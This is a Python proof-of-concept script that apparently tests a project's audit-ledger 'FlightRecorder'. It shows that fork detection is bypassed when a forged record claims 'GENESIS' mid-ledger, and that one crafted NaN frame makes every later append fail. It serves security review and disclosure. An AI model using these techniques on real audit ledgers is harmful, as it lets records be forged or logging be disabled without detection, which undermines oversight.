#!/usr/bin/env python3
"""poc_alpha_17 — v2.2's NEW FlightRecorder append-time fork detection is (a)
bypassable by construction and (b) brickable by one crafted frame.

(a) The under-lock linkage check is skipped whenever the incoming receipt
    claims prev_chain_hash == "GENESIS" (or omits the field):
        if claimed and claimed != actual and claimed != "GENESIS": raise
    A writer forking the ledger simply claims GENESIS — the recorder accepts a
    second "genesis" after 100 records with no ForkDetected. (The check can
    only ever catch writers that honestly declare the wrong tip; an
    adversary declares the right one — `actual` is readable from the file —
    or claims GENESIS. It is an accident-tripwire, not a security boundary.)

(b) The new check runs `canonical(json.loads(last_frame_blob))` UNGUARDED on
    every append. json.loads accepts NaN/Infinity; canonical() rejects them.
    One crafted (or one buggy cross-language producer's) complete frame with
    a NaN makes EVERY subsequent append raise ValueError — the ledger's write
    path is bricked while its read path keeps working (the v1 bug inverted).
"""
import sys, json, copy, tempfile, os
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (FlightRecorder, ForkDetected, build_receipt, chain_hash,
                         generate_keypair, sha256_hex)

SVC = {"type": "service", "id": "svc-deploy-bot", "is_service_account": True,
       "auth_method": "mtls"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]
CID = "chain:prod-0001"
sk, pk = generate_keypair()

def mk(aid, prev, cid=CID):
    return build_receipt(action_id=aid, subject_name="prod:svc", actor=SVC,
                         policy_decision=POL,
                         execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                         evidence_items=EV, prev_chain_hash=prev, signing_key=sk, chain_id=cid)

# (a) fork-append bypass
path = tempfile.mktemp(suffix=".fr")
fr = FlightRecorder(path)
r1 = mk("a-001", "GENESIS")
fr.append(r1)
fr.append(mk("a-002", chain_hash(r1)))
fork = mk("evil-001", "GENESIS")  # second genesis mid-ledger: claims GENESIS, not the tip
bypass = False
try:
    ack = fr.append(fork)
    bypass = ack["durability"] == "LOCAL_ACK"
    print(f"[!] (a) fork append claiming GENESIS accepted mid-ledger: {ack}")
except ForkDetected as e:
    print(f"[*] (a) ForkDetected raised (held): {e}")

# (b) write-path brick via NaN frame
path2 = tempfile.mktemp(suffix=".fr")
fr2 = FlightRecorder(path2)
fr2.append(r1)
nanframe = mk("a-009", chain_hash(r1))
nanframe["predicate"]["execution"]["latency_ms"] = float("nan")
blob = json.dumps(nanframe).encode()  # default allow_nan -> emits NaN; complete, well-framed
with open(path2, "ab") as f:
    f.write(len(blob).to_bytes(4, "big")); f.write(blob)
reads_ok = len(fr2.read_all()) == 2   # read path tolerates it (json.loads accepts NaN)
brick = False
try:
    fr2.append(mk("a-010", chain_hash(nanframe)))
    print("[*] (b) append after NaN frame succeeded (held)")
except ValueError as e:
    brick = True
    print(f"[!] (b) every append after one NaN frame raises: {type(e).__name__}: {str(e)[:70]}")
print(f"[*] (b) read path meanwhile: {len(fr2.read_all())} frames readable")

os.unlink(path); os.unlink(path2)
print("EXPLOIT-WORKS" if (bypass and brick and reads_ok) else "HELD")
